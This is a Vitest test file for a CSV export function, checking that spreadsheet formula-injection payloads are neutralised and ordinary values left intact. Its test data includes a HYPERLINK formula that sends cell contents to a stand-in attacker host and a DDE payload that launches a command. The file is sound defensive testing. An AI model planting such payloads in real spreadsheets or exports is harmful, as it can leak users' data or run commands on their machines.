import { describe, expect, it } from 'vitest'
import { buildCsv } from '../csv-export'

function singleCell(value: unknown): string {
  const csv = buildCsv([{ value }], [{ key: 'value', header: 'Value' }])
  return csv.split('\r\n').slice(1).join('\r\n')
}

describe('buildCsv', () => {
  it.each([
    [
      '=HYPERLINK("https://evil.example/?d="&A1,"Click")',
      `"'=HYPERLINK(""https://evil.example/?d=""&A1,""Click"")"`,
    ],
    ['+1', `"'+1"`],
    ['-1', `"'-1"`],
    ['@SUM(A1:A9)', `"'@SUM(A1:A9)"`],
    ['\t=1+1', `"'\t=1+1"`],
    ['\r=1+1', `"'\r=1+1"`],
    ['=1+1\nsecond line', `"'=1+1\nsecond line"`],
    ["=cmd|' /C calc'!A0", `"'=cmd|' /C calc'!A0"`],
  ])('neutralises the formula payload %j', (payload, expected) => {
    expect(singleCell(payload)).toBe(expected)
  })

  it('leaves ordinary text and numbers unchanged', () => {
    expect(singleCell('merchant@example.com')).toBe('"merchant@example.com"')
    expect(singleCell('Order 1 = paid')).toBe('"Order 1 = paid"')
    expect(singleCell(1500000)).toBe('"1500000"')
  })

  it('neutralises formula payloads in header names taken from row keys', () => {
    const csv = buildCsv([{ '=1+1': 'x' }])
    expect(csv.split('\r\n')[0]).toBe(`"'=1+1"`)
  })

  it('keeps the requested column order and headers', () => {
    const csv = buildCsv(
      [{ id: 'cus_1', email: 'a@example.com', name: '@admin' }],
      [
        { key: 'email', header: 'Email' },
        { key: 'name', header: 'Name' },
      ],
    )
    expect(csv).toBe(`"Email","Name"\r\n"a@example.com","'@admin"`)
  })
})
